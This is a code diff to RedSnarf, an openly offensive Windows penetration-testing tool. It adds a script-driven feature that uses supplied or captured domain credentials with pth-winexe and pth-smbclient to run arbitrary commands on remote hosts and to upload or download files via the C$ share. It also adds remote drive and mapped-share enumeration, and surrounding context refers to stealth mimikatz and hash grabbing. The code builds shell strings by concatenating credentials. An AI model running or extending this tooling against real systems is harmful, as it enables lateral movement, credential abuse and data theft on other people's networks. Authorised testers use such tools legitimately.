@@ -1115,6 +1115,33 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[-]Something went wrong ...",'red')
 					logging.error("[-]Something went wrong running custom command")
 
+			if xscript!='n':
+				try:
+					print colored("[+]Running Command Script: "+xscript,'green')
+					
+					fo=open(xscript,"r").read()
+					for line in fo.splitlines():
+						
+						if line[0:8]=="execute=":
+							command=line[8:len(line)]
+							print colored("[+]Executing Command ",'yellow')+command
+							os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
+						elif line[0:7]=="upload=":
+							upload=line[7:len(line)]
+							print colored("[+]Uploading ",'yellow')+upload
+							os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put "+upload+"\' 2>/dev/null")
+						elif line[0:9]=="download=":
+							download=line[9:len(line)]
+							print colored("[+]Downloading ",'yellow')+download
+							os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+download+"\' 2>/dev/null")
+							
+							if os.path.isfile(outputpath+host+"/"+download):
+								print colored("[+]File Downloaded to ",'yellow')+outputpath+host+"/"+download
+
+				except:
+					print colored("[-]Something went wrong ...",'red')
+					logging.error("[-]Something went wrong running custom command")
+
 			#Routine runs a stealth mimikatz
 			if stealth_mimi in yesanswers or stealth_mimi=="AV":
 				try:
@@ -1596,7 +1623,7 @@ def run():
 			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
 					
 			if x==None or x==True:
-
+        		
 				if smbClient.getServerDNSDomainName()!=domain_name:
 					print colored("[!]"+host+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')	+smbClient.getServerDNSDomainName() 
 
@@ -1703,6 +1730,19 @@ def run():
 						#Check to see if share file exists, if so print status to screen
 						if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
 							print colored("[+]"+host+" Shares written to "+outputpath+targets[0]+'/shares.txt','yellow')
+
+						print colored("[+]"+host+" Enumerating Local Drives",'green')
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'fsutil fsinfo drives' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						drives = proc.communicate()[0]
+						print colored("[+]"+host+" Local " + drives.strip(),'yellow')
+
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'net use' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						mappedshares = proc.communicate()[0]
+						if not "There are no entries in the list" in mappedshares:
+							print colored("[+]"+host+" Mapped drives detected",'green')
+							for line in mappedshares.splitlines():
+								if "\\" in line:
+									print colored("[+]"+line[13:len(line)],'yellow')
 
 						#Start dump thread
 						t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
@@ -1993,7 +2033,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4y", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4z", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2032,6 +2072,7 @@ ugroup.add_argument("-uSS", "--split_spn", dest="split_spn", default="n", help="
 ugroup.add_argument("-uSG", "--session_gopher", dest="session_gopher", default="n", help="<Optional> Run Session Gopher on Remote Machine")
 ugroup.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grep unattended installation files")
 ugroup.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
+ugroup.add_argument("-uXS", "--xscript", dest="xscript", default="n", help="<Optional> Run custom script")
 ugroup.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
 ugroup.add_argument("-uWU", "--windows_updates", dest="windows_updates", default="n", help="<Optional> Get Windows Update Status")
 # Hash related
@@ -2141,6 +2182,7 @@ session_gopher=args.session_gopher
 custom_powershell=args.custom_powershell
 delegated_privs=args.delegated_privs
 windows_updates=args.windows_updates
+xscript=args.xscript
 
 #Check Bash Tab Complete Status and Display to Screen
 print colored("[+]Checking Bash Tab Completion Status",'yellow')
